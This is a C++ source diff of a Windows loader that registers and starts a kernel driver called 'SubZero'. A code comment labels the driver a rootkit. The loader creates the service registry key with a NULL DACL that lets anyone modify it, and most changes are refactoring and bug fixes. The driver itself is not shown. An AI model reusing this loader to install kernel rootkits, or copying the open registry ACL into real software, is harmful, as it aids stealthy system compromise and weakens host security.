@@ -1,4 +1,5 @@
 #include "pch.h"
+#include "..\SubZeroDriver\SubZeroCommon.h"
 #include "ServiceManager.h"
 
 constexpr const DWORD regType = 1;
@@ -8,30 +9,26 @@ constexpr const WCHAR* regDescription = L"X";
 constexpr const WCHAR* driverName = L"subzero";
 constexpr const WCHAR* driverPath = L"C:\\Users\\Daniel\\Desktop\\Drivers\\SubZero\\Debug\\SubZeroDriver.sys";
 
-HKEY CreateRegistryKey(HKEY hKeyRoot, LPCTSTR pszSubKey)
-{
+HKEY CreateRegistryKey(HKEY hKeyRoot, LPCTSTR pszSubKey) {
 	HKEY hKey;
 	DWORD dwFunc;
-	LONG  lRet;
-
-	//------------------------------------------------------------------------------
-
-	SECURITY_DESCRIPTOR SD;
+	LONG  lRes;
+	PACL pACL = NULL;
 	SECURITY_ATTRIBUTES SA;
+	SECURITY_DESCRIPTOR SD;
 
-	if (!InitializeSecurityDescriptor(&SD, SECURITY_DESCRIPTOR_REVISION))
+
+	if (!::InitializeSecurityDescriptor(&SD, SECURITY_DESCRIPTOR_REVISION))
 		return NULL;
 
-	if (!SetSecurityDescriptorDacl(&SD, true, 0, false))
+	if (!::SetSecurityDescriptorDacl(&SD, true, pACL, false))
 		return NULL;
 
 	SA.nLength = sizeof(SA);
 	SA.lpSecurityDescriptor = &SD;
 	SA.bInheritHandle = false;
 
-	//------------------------------------------------------------------------------
-
-	lRet = RegCreateKeyEx(
+	lRes = RegCreateKeyEx(
 		hKeyRoot,
 		pszSubKey,
 		0,
@@ -43,76 +40,63 @@ HKEY CreateRegistryKey(HKEY hKeyRoot, LPCTSTR pszSubKey)
 		&dwFunc
 	);
 	
-	if (lRet) return NULL;
+	if (lRes) return NULL;
 	return hKey;
-	//return lRet ? hKey : NULL;
 }
 
-bool SetRegistryValue(HKEY hKey, LPCTSTR pszValue, DWORD dwType, PVOID pData, DWORD dwSize)
-{
+bool SetRegistryValue(HKEY hKey, LPCTSTR pszValue, DWORD dwType, PVOID pData, DWORD dwSize) {
 	LONG lRes = 0;
-
 	lRes = RegSetValueEx(hKey, pszValue, 0, dwType, (unsigned char*)pData, dwSize);
 
-	RegCloseKey(hKey);
-
-	if (lRes != ERROR_SUCCESS)
-	{
+	if (lRes != ERROR_SUCCESS) {
 		SetLastError(lRes);
 		return false;
 	}
-
 	return true;
 }
 
-
-
 //int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 int wmain(int argc, wchar_t* argv[]) {
-	
 	HKEY hKey;
-
-	hKey = CreateRegistryKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\subzero");
+	hKey = CreateRegistryKey(HKEY_LOCAL_MACHINE, REG_SZ_KEY_PATH);
 
 	if (!hKey) {
-		std::wcout << "[-] Error creating registry key " << GetLastError() << std::endl;
-		return 0;
+		DEBUG_PRINT("[-] Error creating registry key " << GetLastError());
+		return 1;
 	}
 
-	if (!(SetRegistryValue(hKey, L"Type", REG_DWORD, (PVOID)&regType, sizeof(regType)) ||
-		SetRegistryValue(hKey, L"Start", REG_DWORD, (PVOID)&regStart, sizeof(regStart)) || 
-		SetRegistryValue(hKey, L"ErrorControl", REG_DWORD, (PVOID)&regErrorControl, sizeof(regErrorControl)) ||
-		SetRegistryValue(hKey, L"ImagePath", REG_EXPAND_SZ, (PVOID)driverPath, wcslen(driverPath)) ||
-		SetRegistryValue(hKey, L"DisplayName", REG_SZ, (PVOID)driverName, wcslen(driverName)) ||
-		SetRegistryValue(hKey, L"Description", REG_SZ, (PVOID)regDescription, wcslen(regDescription))))
+	// TODO: Fix Type value error
+	size_t dwLetterSize = sizeof(WCHAR);
+	if (!(SetRegistryValue(hKey, L"Type", REG_DWORD, (PVOID)&regType, sizeof(regType)) &&
+		SetRegistryValue(hKey, L"Start", REG_DWORD, (PVOID)&regStart, sizeof(regStart)) && 
+		SetRegistryValue(hKey, L"ErrorControl", REG_DWORD, (PVOID)&regErrorControl, sizeof(regErrorControl)) &&
+		SetRegistryValue(hKey, L"ImagePath", REG_EXPAND_SZ, (PVOID)driverPath, wcslen(driverPath) * dwLetterSize) &&
+		SetRegistryValue(hKey, L"DisplayName", REG_SZ, (PVOID)driverName, wcslen(driverName) * dwLetterSize) &&
+		SetRegistryValue(hKey, L"Description", REG_SZ, (PVOID)regDescription, wcslen(regDescription) * dwLetterSize) &&
+		::RegCloseKey(hKey) == ERROR_SUCCESS))
 	{
-		std::wcout << "[-] Error setting registry values" << std::endl;
-		return 0;
+		DEBUG_PRINT("[-] Error setting registry values " << GetLastError());
+		return 1;
 	}
-
-	bool isInstalled = false;
-	bool isStarted = false;
 
 	// Load rootkit
 	ServiceManager scm(driverName, driverPath, SERVICE_KERNEL_DRIVER);
-	do {
-		isInstalled = scm.Install();
-		if (!isInstalled) {
-			std::wcout << "[+] Error installing the service" << std::endl;
-			break;
-		}
 
-		std::wcout << "[+] Service installed" << std::endl;
+	if (!scm.Install()) {
+		DEBUG_PRINT("[-] Error installing the service");
+		return 1;
+	}
 
-		isStarted = scm.Start();
-		if (!isStarted) {
-			std::wcout << "[+] Error starting the service" << std::endl;
-			break;
-		}
+	DEBUG_PRINT("[+] Service installed");
 
-		std::wcout << "[+] Service started" << std::endl;
+	if (!scm.Start()) {
+		DEBUG_PRINT("[-] Error starting the service");
 
-	} while (false);
+		if (!scm.Remove()) // Also removes registry key
+			DEBUG_PRINT("[-] Error removing the service");
+		return 1;
+	}
 
-	return 1;
+	DEBUG_PRINT("[+] Service started");
+	return 0;
 }
